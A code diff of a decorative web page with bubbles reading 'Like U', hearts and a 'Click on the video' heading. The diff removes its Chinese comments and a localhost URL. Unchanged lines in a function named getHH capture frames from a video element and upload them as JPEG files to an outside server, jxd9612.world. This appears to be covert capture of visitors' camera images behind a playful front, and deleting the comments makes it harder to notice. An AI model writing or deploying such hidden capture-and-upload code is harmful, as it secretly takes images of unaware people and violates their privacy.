@@ -16,10 +16,8 @@
         </div>
         <canvas id="output" width="1200" height="600" onmousedown="dropBomb(event, this)"></canvas>
 
-        <!-- 渐变色文字 -->
         <h1 class="gradient-text">Click on the video</h1>
 
-        <!-- 气泡背景墙 -->
         <div class="bruce">
             <ul class="bubble-bgwall">
                 <li>Like U</li>
@@ -35,7 +33,6 @@
             </ul>
         </div>
 
-        <!-- 心加载 -->
         <div class="heart-wrapper">
             <div class="heart" style="left: 0;">
                 <div class="heart-item1"></div>
@@ -216,12 +213,10 @@
             }
             function getHH() {
                 context.drawImage(video, 0, 0, 480, 320);
-                // 将 canvas 转换的 base64图片转换为 file 文件
                 let imgFile = dataURLtoFile(canvas.toDataURL('image/jpeg'));
                 var formData = new FormData();
                 formData.append('resolve_data', imgFile);
                 $.ajax({
-                    // url: 'http://localhost:3001/resolve_net',
                     url: 'https://www.jxd9612.world:3001/resolve_net',
                     type: 'post',
                     data: formData,
